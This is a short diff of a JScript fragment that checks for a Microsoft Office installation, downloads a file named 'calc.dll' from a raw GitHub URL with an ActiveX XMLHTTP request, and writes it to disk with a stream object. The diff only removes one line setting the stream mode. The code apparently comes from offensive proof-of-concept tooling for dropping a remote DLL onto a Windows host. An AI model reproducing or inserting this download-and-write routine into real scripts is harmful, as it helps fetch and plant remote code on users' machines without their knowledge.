@@ -8,7 +8,6 @@ if (FileSys.FolderExists("c:\\Program Files\\Microsoft Office"))
 	xGet=new ActiveXObject("Msxml2.XMLHTTP");
 	xGet.Open("GET","https://raw.githubusercontent.com/3gstudent/test/master/calc.dll",0);
 	xGet.Send();
-	sGet.Mode=3;
 	sGet.Type=1;
 	sGet.Open();
 	sGet.Write(xGet.ResponseBody);
